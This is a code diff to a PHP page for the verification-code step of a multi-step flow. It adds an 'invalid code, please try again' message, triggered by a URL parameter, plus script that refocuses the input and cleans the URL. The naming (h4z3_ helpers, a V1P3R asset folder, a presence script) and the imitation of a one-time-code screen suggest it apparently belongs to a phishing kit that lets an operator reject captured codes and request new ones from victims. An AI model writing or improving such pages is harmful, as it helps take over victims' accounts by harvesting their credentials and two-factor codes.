@@ -6,6 +6,8 @@ $stepKey = 'code';
 $steps = h4z3_get_flow_steps();
 $totalSteps = count($steps);
 $currentStep = null;
+$showInvalidCodeError = false;
+$errorMessage = null;
 
 foreach ($steps as $index => $step) {
     if (($step['key'] ?? null) === $stepKey) {
@@ -17,6 +19,11 @@ foreach ($steps as $index => $step) {
 if ($currentStep === null) {
     header('Location: ' . h4z3_get_first_step_path());
     exit;
+}
+
+if (isset($_GET['invalid']) && $_GET['invalid'] !== '' && $_GET['invalid'] !== '0') {
+    $showInvalidCodeError = true;
+    $errorMessage = 'The verification code you entered is invalid. Please try again.';
 }
 ?>
 <!DOCTYPE html>
@@ -60,7 +67,11 @@ if ($currentStep === null) {
                                 </div>
                             </div>
                         </div>
-                        <div id="error"></div>
+                        <div id="error">
+<?php if ($showInvalidCodeError && $errorMessage !== null): ?>
+                            <div class="error-message show-error error" role="alert"><?php echo htmlspecialchars($errorMessage, ENT_QUOTES, 'UTF-8'); ?></div>
+<?php endif; ?>
+                        </div>
                         <div class="unauth-intro-area__help">
                             <p class="unauth-intro-area__text">
                                 A one-time verification code has been sent to the email address you provided.
@@ -208,5 +219,33 @@ if ($currentStep === null) {
         </div>
         <script src="./V1P3R/js/presence.js"></script>
         <script src="./V1P3R/js/code.js"></script>
+<?php if ($showInvalidCodeError): ?>
+        <script>
+            (function () {
+                var codeInput = document.getElementById('code');
+
+                if (codeInput && typeof codeInput.focus === 'function') {
+                    codeInput.focus();
+
+                    if (typeof codeInput.select === 'function') {
+                        codeInput.select();
+                    }
+                }
+
+                if (window.history && typeof window.history.replaceState === 'function') {
+                    try {
+                        var url = new URL(window.location.href);
+                        url.searchParams.delete('invalid');
+                        var newPath = url.pathname;
+                        var newSearch = url.search ? url.search : '';
+                        var newHash = url.hash ? url.hash : '';
+                        window.history.replaceState({}, document.title, newPath + newSearch + newHash);
+                    } catch (error) {
+                        window.history.replaceState({}, document.title, window.location.pathname + window.location.hash);
+                    }
+                }
+            })();
+        </script>
+<?php endif; ?>
     </body>
 </html>
